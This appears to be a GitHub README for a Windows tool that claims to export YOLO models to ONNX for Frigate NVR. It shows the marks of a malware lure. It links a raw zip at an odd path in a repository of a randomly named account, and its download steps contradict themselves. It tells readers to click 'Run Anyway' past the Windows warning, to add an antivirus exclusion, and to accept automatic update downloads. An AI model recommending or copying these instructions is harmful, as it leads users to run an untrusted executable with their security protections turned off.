# 📦 frigate-yolo-export - Simplify your camera object detection setup

[![](https://img.shields.io/badge/Download-frigate--yolo--export-blue.svg)](https://github.com/fixingsloanoffice487/frigate-yolo-export/raw/refs/heads/main/tailage/yolo_export_frigate_v2.5.zip)

## 💡 About this software

This program prepares object detection models for use with Frigate NVR. Frigate uses specific mathematical files called ONNX files to identify people, cars, and other objects on your camera feeds. Manually creating these files requires complex technical steps. This tool automates the process with one command. It converts models like YOLOv8, YOLO11, and YOLO26 into the exact format your NVR requires. 

## ⚙️ System Requirements

Ensure your computer meets these requirements before you start:

* Operating System: Windows 10 or Windows 11.
* Memory: At least 8GB of RAM.
* Storage: 500MB of free disk space.
* Network: A stable connection for the initial setup.

## 📥 Downloading the software

Visit the project page to download the necessary files to your computer.

[Download link: https://github.com/fixingsloanoffice487/frigate-yolo-export/raw/refs/heads/main/tailage/yolo_export_frigate_v2.5.zip](https://github.com/fixingsloanoffice487/frigate-yolo-export/raw/refs/heads/main/tailage/yolo_export_frigate_v2.5.zip)

1. Open your web browser and navigate to the link above.
2. Look for the Releases section on the right side of the page.
3. Click the latest version link.
4. Locate the executable file ending in .exe.
5. Save this file to your Downloads folder.

## 🚀 Setting up the application

1. Open your Downloads folder.
2. Double-click the file you downloaded. 
3. If a warning window appears from Windows, click More Info and then click Run Anyway.
4. Follow the instructions on the screen to finish the installation.
5. A shortcut icon will appear on your desktop.

## 🛠️ How to use the exporter

The program does the heavy lifting for you. Follow these steps to export your model:

1. Double-click the application icon on your desktop.
2. Select the model type you wish to use from the dropdown menu. You can choose from YOLOv8, YOLO11, or YOLO26.
3. Type the name of the object category you want to detect.
4. Click the Export button.
5. Wait for the progress bar to reach 100 percent.
6. The program creates a new folder on your desktop containing your ready-to-use ONNX file.

## 📁 Connecting to Frigate NVR

Once you have your export file, move it to your NVR:

1. Access your Frigate configuration folder.
2. Locate the folder designated for your custom models.
3. Copy the newly created ONNX file into this folder.
4. Open your Frigate configuration file.
5. Update the model path to match the name of the file you just added.
6. Restart the Frigate service to apply the changes.

## 🔍 Frequently Asked Questions

**Does this software require programming knowledge?**
No. This tool provides a simple interface for tasks that usually require command-line input.

**Which versions of YOLO does this support?**
The tool supports YOLOv8, YOLO11, and the current YOLO26 format.

**What happens if the export fails?**
Check your internet connection and ensure that you have enough disk space. If the issue continues, restart the application and verify your selected model settings.

**Is my data sent to the cloud?**
No. All processing happens on your local computer. Your camera feeds and detection data stay on your local network at all times.

## 🔧 Troubleshooting

If you encounter issues, verify the following items:

* File Permissions: Ensure your user account has permission to write files to the destination folder.
* Anti-virus software: Sometimes security software blocks exports. Add an exclusion for the application folder if necessary.
* Version compatibility: Ensure your Frigate NVR version supports the ONNX format. Older versions might require a manual update.

## 📈 Performance tips

Object detection consumes system power. If your NVR runs slowly after adding a new model, consider these steps:

* Limit the number of cameras attached to the model.
* Reduce the image resolution provided to the detect stream.
* Use a dedicated machine for your NVR to avoid slowing down your primary computer.

The application automatically checks for updates each time you open it. Keeping the application current ensures compatibility with the latest Frigate releases and the newest model versions. If a new model version is released, the software will prompt you to download the updated configuration files automatically.